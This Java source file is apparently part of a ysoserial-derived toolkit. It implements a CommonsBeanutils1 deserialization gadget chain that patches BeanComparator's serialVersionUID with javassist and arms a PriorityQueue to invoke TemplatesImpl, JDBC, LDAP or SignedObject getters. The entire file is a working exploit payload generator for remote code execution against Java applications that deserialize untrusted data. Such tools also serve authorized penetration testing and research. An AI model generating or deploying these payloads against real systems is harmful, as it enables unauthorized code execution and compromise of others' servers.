package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.payloads.custom.CustomCommand;
import cn.butler.yso.payloads.util.Gadgets;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import cn.butler.yso.JavassistClassLoader;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Reflections;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF })
public class CommonsBeanutils1_183 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object object = Gadgets.createGetter(command);

        // 修改BeanComparator类的serialVersionUID
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");

        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));

        // mock method name until armed
        final Comparator comparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Reflections.setFieldValue(comparator, "property", "lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

        // switch method called by comparator
        String property_value = "";
        if (command.startsWith(CustomCommand.GETTER_JDBC)) {
            property_value = "connection";
        }else if(command.startsWith(CustomCommand.GETTER_TEMPlATESIMPL) || command.startsWith(CustomCommand.GETTER_TEMPLATESIMPL0)){
            property_value = "outputProperties";
        }else if(command.startsWith(CustomCommand.GETTER_LDAPATTRIBUTE)){
            property_value = "attributeDefinition";
        }else if(command.startsWith(CustomCommand.GETTER_SIGNEDOBJECT)){
            property_value = "object";
        }
        Reflections.setFieldValue(comparator, "property", property_value);
		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = object;
		queueArray[1] = object;
        ctBeanComparator.defrost();
		return queue;
	}

	public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils1_183.class, args);
	}
}
